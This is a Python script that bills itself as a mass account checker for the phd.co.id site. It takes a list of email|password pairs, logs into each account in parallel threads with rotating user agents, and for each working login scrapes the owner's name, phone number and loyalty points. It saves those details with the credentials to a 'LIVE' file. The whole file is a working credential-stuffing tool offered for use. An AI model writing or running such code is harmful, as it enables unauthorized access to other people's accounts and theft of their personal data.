#!/usr/bin/env python
# Created By Wibu Heker
# Powered By Rintod.DEV
# https://web.facebook.com/wibuheker/
import requests, re, warnings, sys, argparse
from termcolor import colored
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

def doSave(filename, data):
    f = open(filename, 'a+')
    f.write(data + "\n")
    f.close()

def doCheck(empass):
    try:
        email, pasw = empass.split('|', 2)
        ses = requests.Session()
        headers = {
            'User-Agent': UserAgent().random
        }
        getToken = ses.get('https://www.phd.co.id/en/users/login/1', headers=headers, verify=False)
        token = re.findall(r'name="my_token" value="(.*?)"', getToken.text)[0]
        dataLogin = {
            "return_url": "https://www.phd.co.id/en/users/welcome",
            "my_token": token,
            "username": email,
            "password": pasw,
            "remember": "1"
        }
        doLogin = ses.post('https://www.phd.co.id/en/users/login/1', data=dataLogin, headers=headers, verify=False)
        if 'identity=' in doLogin.headers['set-cookie']:
            doGetData = ses.get('https://www.phd.co.id/en/accounts', headers=headers, verify=False)
            getName = ses.get('https://www.phd.co.id/en/getpopup/editAccount', headers=headers, verify=False)
            firstName = re.findall(r'class="fname" name="fname" value="(.*?)"', getName.text)[0]
            lastName = re.findall(r'class="lname" name="lname" value="(.*?)"', getName.text)[0]
            noHP = re.findall(r'<li class="owner-telephone">(.*?)</li>', doGetData.text)[0]
            POIN = re.findall(r'<li class="owner-poin">(.*?)</li>', doGetData.text)[0].replace('Poin: ', '')
            data = "%s|%s -> %s|%s|%s|%s" % (email, pasw, POIN, noHP, firstName, lastName)
            print(colored('LIVE!', 'green') + " " + data)
            doSave('PHD_LIVE.txt', data)
        else:
            print(colored('DIE!', 'red') + " " + empass)
            doSave('PHD_DIE.txt', empass)
    except Exception as e:
        print('OOPS! ' + str(e))

parser = argparse.ArgumentParser(description='PHD MASS ACCOUNT CHECKER')
parser.add_argument('--list', help='List of ur mail|pass list', required=True)
parser.add_argument('--thread', help='Threading Proccess for fast checking max 10')
wibuheker = parser.parse_args()
try:
    wibuList = open(wibuheker.list, 'r').read().splitlines()
    if wibuheker.thread and wibuheker.thread is not None:
        with ThreadPoolExecutor(max_workers=int(wibuheker.thread)) as execute:
            for empass in wibuList:
                execute.submit(doCheck, empass)
    else:
        for empass in wibuList:
            doCheck(empass)
except Exception as e:
    print('OOPS! ' + str(e))
